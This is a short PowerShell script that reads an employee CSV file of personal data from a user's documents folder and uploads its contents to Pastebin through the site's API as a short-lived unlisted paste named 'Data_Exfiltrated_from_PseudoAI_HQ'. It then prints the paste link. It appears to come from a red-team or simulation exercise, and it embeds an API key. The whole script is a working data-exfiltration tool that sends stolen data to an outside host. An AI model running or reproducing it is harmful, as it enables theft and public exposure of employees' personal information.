# Define your Pastebin API Key (replace with your actual API key)
$apiKey = "83G5413gfaDH-_rwRuLYIEPJR3vLeWmE"
  
# Define the Pastebin API endpoint
$pasteApiUrl = "https://pastebin.com/api/api_post.php"
 
# Define the path to the employee.csv file
$pii_data_path = "c:\users\cdanvers\documents\employee.csv"
$pii_data = Get-Content -Path $pii_data_path -Raw
 
# Prepare the body for the HTTP POST request
$body = @{
        api_dev_key = $apiKey
        api_option = 'paste'
        api_paste_code = $pii_data  # Exfiltrate the file content
        api_paste_private = '1'  # Set to '1' for unlisted paste, '0' for public, '2' for private (requires login)
        api_paste_name = "Data_Exfiltrated_from_PseudoAI_HQ"
        api_paste_expire_date = '10M'  # Expiration time (N = never, 10M = 10 minutes, etc.)
        api_paste_format = "text"
}
 
# Send the data using an HTTP POST request
$response = Invoke-RestMethod -Uri $pasteApiUrl -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
 
# Output the Pastebin link where the data is uploaded
Write-Host "Data exfiltrated to Pastebin: $response"
